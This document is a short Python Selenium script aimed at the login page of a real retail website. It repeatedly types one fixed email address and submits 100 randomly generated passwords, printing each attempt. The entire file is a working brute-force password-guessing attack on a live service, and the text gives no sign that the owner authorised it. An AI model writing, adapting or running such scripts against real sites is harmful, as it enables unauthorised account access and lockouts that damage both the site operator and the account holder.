import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver =  webdriver.Chrome('C:\Selenium\chromedriver.exe') 
driver.get("https://www.emp-online.es/login")
time.sleep(5)
webdriver.ActionChains(driver).send_keys(Keys.ESCAPE).perform()
time.sleep(5)
letters_n_digits = string.ascii_lowercase + string.digits
for x in range(100):
    #//*[@id="dwfrm_login_username_d0fnhkztkbcg"]
    usr = driver.find_element_by_xpath("//input[starts-with(@id,'dwfrm_login_username_d0')]")
    usr.clear()
    usr.send_keys("error0290.3@gmail.com")
    #//*[@id="dwfrm_login_password_d0vxvqptffvb"]
    psw = driver.find_element_by_xpath("//input[starts-with(@id,'dwfrm_login_password_d0')]")
    str = ''.join(random.choice(letters_n_digits) for i in range(8)) + '@'
    psw.send_keys(str)
    print(str)
    clk = driver.find_element_by_id("loginButton").click()